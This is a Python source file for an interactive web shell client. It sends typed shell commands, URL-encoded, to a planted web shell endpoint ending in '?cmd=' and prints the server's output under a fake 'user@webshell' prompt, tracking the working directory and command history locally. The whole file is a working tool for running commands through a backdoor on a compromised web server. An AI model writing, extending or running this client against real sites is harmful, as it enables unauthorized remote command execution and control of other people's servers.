import requests
import urllib.parse
import sys
import readline
import argparse
import shutil
from termcolor import colored

def send_command(command, path, base_url):
    full_command = f"cd {path} && {command}" if command != "cd" else "cd " + path
    encoded_command = urllib.parse.quote(full_command)
    url = f"{base_url}{encoded_command}"

    try:
        response = requests.get(url)
        print(colored(response.text, 'green'))
    except requests.RequestException as e:
        print(colored(f"Error: {e}", 'red'))

def get_prompt(current_path):
    user = colored("user", "cyan")
    hostname = colored("webshell", "yellow")
    path = colored(current_path, "blue")
    return f"{user}@{hostname}:{path}$ "

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WebShell Client")
    parser.add_argument("url", help="Base URL of the web shell ending with '?cmd=', e.g., http://example.com/shell.php?cmd=")
    args = parser.parse_args()
    
    base_url = args.url
    if not base_url.endswith("?cmd="):
        print(colored("Error: The provided URL must end with '?cmd=' for command execution.", "red"))
        sys.exit(1)
    
    current_path = "/"
    history_file = ".shell_history"
    
    try:
        readline.read_history_file(history_file)
    except FileNotFoundError:
        pass
    
    while True:
        try:
            command = input(get_prompt(current_path))
            readline.write_history_file(history_file)
        except (EOFError, KeyboardInterrupt):
            print(colored("\nExiting shell.", "red"))
            break
        
        if command.lower() in ["exit", "quit"]:
            break
        
        if command.startswith("cd "):
            new_path = command[3:].strip()
            if new_path == "..":
                current_path = "/".join(current_path.rstrip("/").split("/")[:-1]) or "/"
            elif new_path.startswith("/"):
                current_path = new_path
            else:
                current_path = f"{current_path}/{new_path}".replace("//", "/")
            continue
        
        send_command(command, current_path, base_url)
